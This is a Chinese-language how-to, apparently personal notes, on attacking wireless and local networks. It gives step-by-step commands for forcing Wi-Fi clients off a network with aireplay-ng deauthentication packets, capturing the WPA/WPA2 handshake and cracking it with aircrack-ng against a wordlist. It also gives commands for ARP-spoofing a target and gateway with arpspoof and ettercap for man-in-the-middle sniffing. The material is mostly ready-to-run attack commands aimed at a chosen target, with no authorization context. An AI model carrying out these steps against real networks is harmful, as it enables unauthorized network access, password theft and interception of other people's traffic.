# Deauth

`aircrack-ng` 是一个用于无线网络安全审计的工具包，主要用于捕获数据包并进行 WEP 和 WPA/WPA2 密码破解。以下是使用 `aircrack-ng` 的基本步骤：

### 1. 安装 aircrack-ng

在 Kali Linux 或其他 Debian/Ubuntu 系统上，可以使用以下命令安装：

```bash
sudo apt update
sudo apt install aircrack-ng
```

### 2. 切换到监控模式

首先，你需要将无线网卡切换到监控模式。使用以下命令：

```bash
sudo airmon-ng start <your_wireless_interface>
```

其中，`<your_wireless_interface>` 是你的无线网卡名称，例如 `wlan0`。

### 3. 监控网络流量

使用 `airodump-ng` 监控附近的无线网络：

```bash
sudo airodump-ng <monitor_interface>
```

其中，`<monitor_interface>` 是你在监控模式下的无线网卡名称（例如 `wlan0mon`）。

### 4. 捕获数据包

当你在 `airodump-ng` 界面中看到目标网络后，记录下其 BSSID 和频道（CH）。

使用以下命令仅捕获特定网络的数据包：

```bash
sudo airodump-ng --bssid <target_bssid> -c <target_channel> -w <output_file> <monitor_interface>
```

- `<target_bssid>`：目标网络的 BSSID。
- `<target_channel>`：目标网络的频道。
- `<output_file>`：捕获数据包的文件名。
- `<monitor_interface>`：你的监控接口名称。

### 5. 进行攻击（可选）

如果你想要捕获 WPA/WPA2 握手包，你可以执行以下步骤：

使用 `aireplay-ng` 注入数据包，促使客户端重新连接并获取握手包：

```bash
sudo aireplay-ng --deauth 10 -a <target_bssid> -c <client_mac> <monitor_interface>
```

- `10`：表示发送 10 个 deauthentication 数据包。
- `<client_mac>`：要断开连接的客户端的 MAC 地址（可选，如果不想指定，可以省略）。
- `<target_bssid>`：目标网络的 BSSID。

### 6. 破解密码

使用 `aircrack-ng` 破解捕获的握手数据包：

```
sudo aircrack-ng <output_file>.cap
```

这里，`<output_file>.cap` 是捕获的数据包文件名。

如果你有字典文件，可以指定它进行破解：

```bash
sudo aircrack-ng -w <wordlist_file> <output_file>.cap
```

- `<wordlist_file>`：包含潜在密码的字典文件路径。

# Arp欺骗

##  arpspoof

`arpspoof` 是 `dsniff` 工具包中的一个实用工具。它可以轻松地进行 ARP 欺骗。

### 安装 dsniff

如果 `dsniff` 未安装，可以通过以下命令进行安装：

```
sudo apt update
sudo apt install dsniff
```

### 使用 `arpspoof`

1. **启用 IP 转发**

   在进行 ARP 欺骗之前，需要启用 IP 转发，以便将流量转发到受害者：

   ```
   echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
   # 1 为启用转发，0为禁止转发，会导致断网
   ```

2. **选择目标和网关**

   确定你要欺骗的目标 IP 和网关 IP。例如，目标 IP 为 `192.168.1.10`，网关 IP 为 `192.168.1.1`。

3. **开始 ARP 欺骗**

   打开两个终端，分别执行以下命令：

   - 在第一个终端中，将网关欺骗目标：

     ```bash
     sudo arpspoof -i <你的网络接口> -t 192.168.1.10 192.168.1.1
     ```

   - 在第二个终端中，将目标欺骗网关：

     ```
     sudo arpspoof -i <你的网络接口> -t 192.168.1.1 192.168.1.10
     ```

4. **停止 ARP 欺骗**

   使用 `Ctrl+C` 停止命令。

##  ettercap

`ettercap` 是一个功能强大的网络嗅探和中间人攻击工具。

### 安装 `ettercap`

如果 `ettercap` 未安装，可以通过以下命令进行安装：

```
sudo apt update
sudo apt install ettercap-gtk
```

### 使用 `ettercap`

1. **启动 `ettercap`**

   打开 `ettercap` GUI：

   ```
   sudo ettercap -G
   ```

2. **选择网络接口**

   在 `ettercap` 界面中，选择你要使用的网络接口。

3. **扫描网络**

   选择 **Hosts** > **Scan for hosts**，扫描网络中的设备。

4. **添加目标**

   选择 **Hosts** > **Host List**，找到目标和网关 IP，选中后点击 **Add to Target 1** 和 **Add to Target 2**。

5. **开始 ARP 欺骗**

   在菜单中选择 **Mitm** > **ARP poisoning**，勾选 **Sniff remote connections**，然后点击 **OK**。

6. **开始嗅探**

   点击工具栏中的 **Start Sniffing** 按钮，开始嗅探流量。

7. **停止 ARP 欺骗**

   关闭 `ettercap` 或使用菜单中的选项停止嗅探